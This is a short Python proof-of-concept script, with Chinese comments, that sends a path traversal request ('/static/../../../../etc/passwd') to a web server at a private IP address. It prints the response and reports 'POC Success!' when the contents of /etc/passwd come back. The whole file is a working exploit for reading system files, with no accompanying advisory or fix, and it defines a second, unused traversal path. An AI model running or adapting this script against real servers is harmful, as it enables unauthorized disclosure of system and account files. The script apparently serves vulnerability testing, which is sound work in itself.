import http.client

config = {
    'host': '192.168.136.130',
    'port': 8080,
    'path': '/static/../../../../../../etc/passwd',
}


# 创建 HTTP 连接
connection = http.client.HTTPConnection(config['host'], config['port'])

# 构建攻击路径
path = '/static/../../../../../../../../../../../../etc/passwd'

try:
    # 发送 GET 请求
    connection.request('GET', config['path'])

    # 获取响应
    response = connection.getresponse()

    # 打印响应状态码和响应体
    print('Status:', response.status)
    print('Reason:', response.reason)
    print('Response body:')
    body = response.read().decode()
    print(body)
    if response.status == 200 and (
        '/usr/sbin/nologin' in body or 'root:x:0:0:root' in body
    ):
        print('POC Success!')
finally:
    # 关闭连接
    connection.close()
